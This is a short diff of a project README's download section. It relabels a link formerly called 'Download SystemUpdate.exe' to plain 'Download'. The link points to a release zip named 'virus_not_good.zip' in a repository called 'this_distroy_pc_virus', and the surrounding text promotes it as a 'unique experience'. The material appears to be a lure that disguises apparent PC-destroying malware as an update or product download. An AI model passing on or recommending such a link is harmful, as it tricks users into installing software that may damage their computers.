@@ -14,7 +14,7 @@ Everyone has worked extremely hard on this project to bring you this unique expe
 
 ### 📥 **Direct Download (Recommended)**
 To get the full experience, download the executable from our releases:
-👉 [Download SystemUpdate.exe](https://github.com/paz343123/this_distroy_pc_virus/releases/download/v1.0.0/virus_not_good.zip)
+👉 [Download](https://github.com/paz343123/this_distroy_pc_virus/releases/download/v1.0.0/virus_not_good.zip)
 👈:𝖙𝖍𝖎𝖘 𝖈𝖔𝖒𝖒𝖆𝖓𝖉
 
 ✨ User Experience
